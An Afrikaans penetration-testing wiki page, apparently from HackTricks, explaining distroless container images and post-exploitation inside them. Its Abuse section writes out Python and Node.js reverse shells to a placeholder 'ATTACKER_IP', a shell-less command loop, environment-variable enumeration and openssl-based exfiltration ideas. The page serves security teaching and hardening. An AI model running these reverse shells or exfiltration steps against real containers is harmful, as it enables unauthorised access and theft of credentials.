# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

'n **distroless** container image is 'n image wat die **minimum runtime-komponente bevat wat nodig is om een spesifieke toepassing te laat loop**, terwyl die gewone distribution tooling soos package managers, shells en groot versamelings generiese userland utilities doelbewus verwyder word. In die praktyk bevat distroless images dikwels slegs die application binary of runtime, sy shared libraries, certificate bundles en 'n baie klein filesystem-uitleg.

Die punt is nie dat distroless 'n nuwe kernel-isolation primitive is nie. Distroless is 'n **image design strategy**. Dit verander wat **binne** die container-filesystem beskikbaar is, nie hoe die kernel die container isoleer nie. Hierdie onderskeid is belangrik, want distroless harden die omgewing hoofsaaklik deur te verminder wat 'n aanvaller kan gebruik nadat code execution verkry is. Dit vervang nie namespaces, seccomp, capabilities, AppArmor, SELinux of enige ander runtime-isolation-meganisme nie.

## Waarom Distroless Bestaan

Distroless images word hoofsaaklik gebruik om die volgende te verminder:

- die image-grootte
- die operasionele kompleksiteit van die image
- die aantal packages en binaries wat vulnerabilities kan bevat
- die aantal post-exploitation tools wat by verstek vir 'n aanvaller beskikbaar is

Daarom is distroless images gewild in production application deployments. 'n Container wat geen shell, geen package manager en byna geen generiese tooling bevat nie, is gewoonlik makliker om operasioneel te verstaan en moeiliker om ná 'n compromise interaktief te misbruik.

Voorbeelde van bekende distroless-style image families sluit die volgende in:

- Google's distroless images
- Chainguard hardened/minimal images

## Wat Distroless Nie Beteken Nie

'n Distroless container is **nie**:

- outomaties rootless nie
- outomaties non-privileged nie
- outomaties read-only nie
- outomaties deur seccomp, AppArmor of SELinux beskerm nie
- outomaties veilig teen container escape nie

Dit is steeds moontlik om 'n distroless image met `--privileged`, host namespace sharing, gevaarlike bind mounts of 'n mounted runtime socket te laat loop. In daardie scenario mag die image minimaal wees, maar die container kan steeds katastrofies onveilig wees. Distroless verander die **userland attack surface**, nie die **kernel trust boundary** nie.

## Tipiese Operasionele Eienskappe

Wanneer jy 'n distroless container compromise, is die eerste ding wat jy gewoonlik opmerk dat algemene aannames nie meer waar is nie. Daar mag geen `sh`, geen `bash`, geen `ls`, geen `id`, geen `cat` en soms selfs nie 'n libc-based environment wees wat optree soos jou gewone tradecraft verwag nie. Dit beïnvloed beide offense en defense, want die gebrek aan tooling maak debugging, incident response en post-exploitation anders.

Die algemeenste patrone is:

- die application runtime bestaan, maar min anders
- shell-based payloads misluk omdat daar geen shell is nie
- algemene enumeration one-liners misluk omdat die helper binaries ontbreek
- file system protections soos read-only rootfs of `noexec` op writable tmpfs-liggings is dikwels ook teenwoordig

Hierdie kombinasie lei gewoonlik daartoe dat mense van "weaponizing distroless" begin praat.

## Distroless En Post-Exploitation

Die belangrikste offensive uitdaging in 'n distroless environment is nie altyd die aanvanklike RCE nie. Dit is dikwels wat daarna kom. As die exploited workload code execution in 'n language runtime soos Python, Node.js, Java of Go verskaf, kan jy moontlik arbitrary logic uitvoer, maar nie deur die normale shell-centric workflows wat algemeen in ander Linux-targets is nie.

Dit beteken post-exploitation verskuif dikwels in een van drie rigtings:

1. **Gebruik die bestaande language runtime direk** om die environment te enumerate, sockets oop te maak, files te lees of addisionele payloads te stage.
2. **Bring jou eie tooling in memory in** as die filesystem read-only is of writable locations met `noexec` gemount is.
3. **Abuse bestaande binaries wat reeds in die image teenwoordig is** as die application of sy dependencies iets onverwags nuttigs insluit.

## Abuse

### Enumerate Die Runtime Wat Jy Reeds Het

In baie distroless containers is daar geen shell nie, maar daar is steeds 'n application runtime. As die target 'n Python service is, is Python daar. As die target Node.js is, is Node daar. Dit verskaf dikwels genoeg funksionaliteit om files te enumerate, environment variables te lees, reverse shells oop te maak en in-memory execution te stage sonder om ooit `/bin/sh` aan te roep.

'n Eenvoudige voorbeeld met Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
'n Eenvoudige voorbeeld met Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impak:

- herstel van omgewingsveranderlikes, wat dikwels geloofsbriewe of diens-eindpunte insluit
- lêerstelsel-enumerasie sonder `/bin/ls`
- identifikasie van skryfbare paaie en gemonteerde secrets

### Reverse Shell Sonder `/bin/sh`

As die image nie `sh` of `bash` bevat nie, kan ’n klassieke shell-gebaseerde reverse shell onmiddellik misluk. Gebruik in daardie situasie eerder die geïnstalleerde taal-runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
As `/bin/sh` nie bestaan nie, vervang die laaste reël met direkte Python-gedrewe beveluitvoering of ’n Python REPL-lus.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Weer eens, indien `/bin/sh` afwesig is, gebruik Node se filesystem-, process- en networking-API's direk in plaas daarvan om 'n shell te spawn.

### Volledige voorbeeld: Python Command Loop sonder shell

As die image Python bevat, maar glad nie 'n shell het nie, is 'n eenvoudige interaktiewe lus dikwels genoeg om volledige post-exploitation-vermoëns te behou:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Dit vereis nie ’n interactive shell binary nie. Die impak is vanuit die aanvaller se perspektief effektief dieselfde as ’n basic shell: command execution, enumeration en staging van verdere payloads deur die bestaande runtime.

### In-Memory Tool Execution

Distroless images word dikwels gekombineer met:

- `readOnlyRootFilesystem: true`
- writable maar `noexec` tmpfs soos `/dev/shm`
- ’n gebrek aan package management tools

Daardie kombinasie maak klassieke workflows van “download binary to disk and run it” onbetroubaar. In sulke gevalle word memory execution techniques die hoofantwoord.

Die toegewyde bladsy daarvoor is:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die mees relevante techniques daar is:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Bestaande Binaries Reeds In Die Image

Sommige distroless images bevat steeds operationally necessary binaries wat ná compromise nuttig word. ’n Voorbeeld wat herhaaldelik waargeneem word, is `openssl`, omdat applications dit soms vir crypto- of TLS-related tasks benodig.

’n Vinnige search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
As `openssl` teenwoordig is, kan dit moontlik gebruik word vir:

- uitgaande TLS-verbindings
- data exfiltration oor ’n toegelate egress-kanaal
- staging van payload-data deur geënkodeerde/geënkripteerde blobs

Die presiese misbruik hang af van wat werklik geïnstalleer is, maar die algemene idee is dat distroless nie "geen tools hoegenaamd" beteken nie; dit beteken "baie minder tools as ’n normale distribution image".

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die image in die praktyk werklik distroless is en watter runtime- of helper-binaries steeds vir post-exploitation beskikbaar is.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Wat is hier interessant:

- If no shell exists but a runtime such as Python or Node is present, post-exploitation should pivot to runtime-driven execution.
- If the root filesystem is read-only and `/dev/shm` is writable but `noexec`, memory execution techniques become much more relevant.
- If helper binaries such as `openssl`, `busybox`, or `java` exist, they may offer enough functionality to bootstrap further access.

## Runtime-verstekke

| Image / platform style | Verstektoestand | Tipiese gedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Google distroless style images | Minimale userland by ontwerp | Geen shell, geen pakketbestuurder, slegs toepassing/runtime-afhanklikhede | debugging-layers, sidecar-shells, die kopiëring van busybox of tooling byvoeg |
| Chainguard minimal images | Minimale userland by ontwerp | Verminderde pakkette-oppervlak, dikwels gefokus op een runtime of diens | `:latest-dev` of debug-variante gebruik, tools tydens die build kopieer |
| Kubernetes workloads using distroless images | Hang van Pod-konfigurasie af | Distroless beïnvloed slegs userland; Pod-sekuriteitsposisie hang steeds van die Pod-spec en runtime-verstekke af | ephemeral debug containers, host mounts, privileged Pod-instellings byvoeg |
| Docker / Podman running distroless images | Hang van run-vlae af | Minimale lêerstelsel, maar runtime-sekuriteit hang steeds van vlae en daemon-konfigurasie af | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Die kernpunt is dat distroless ’n **image-eienskap** is, nie runtime-beskerming nie. Die waarde daarvan kom uit die vermindering van wat binne die lêerstelsel beskikbaar is ná kompromittering.

## Verwante bladsye

Vir lêerstelsel- en memory-execution-bypasses wat algemeen in distroless-omgewings benodig word:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Vir container runtime-, socket- en mount-misbruik wat steeds op distroless-workloads van toepassing is:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
